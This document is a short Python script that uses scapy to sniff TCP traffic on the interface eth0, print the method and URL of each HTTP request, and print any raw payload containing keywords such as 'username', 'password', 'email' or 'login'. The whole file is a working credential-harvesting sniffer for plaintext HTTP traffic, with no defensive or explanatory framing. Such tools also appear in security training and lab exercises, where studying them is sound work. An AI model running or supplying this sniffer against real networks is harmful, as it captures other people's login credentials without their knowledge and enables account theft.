import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp")


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("----------")
        # get url and Http Method and print them
        url = packet[http.HTTPRequest].Host.decode("utf-8") + packet[
            http.HTTPRequest
        ].Path.decode("utf-8")
        http_method = packet[http.HTTPRequest].Method.decode("utf-8")
        print("> HTTP Method: %s" % http_method)
        print("> URL: %s" % url)

        # get raw payload and print, if theres any of the keywords we are interested in
        if packet.haslayer(scapy.Raw):
            keywords = ["username", "password", "uname", "pass", "email", "login"]
            payload = str(packet[scapy.Raw].load)
            for term in keywords:
                if term in payload:
                    print("> Payload captured: %s" % payload)
                    break


sniff("eth0")
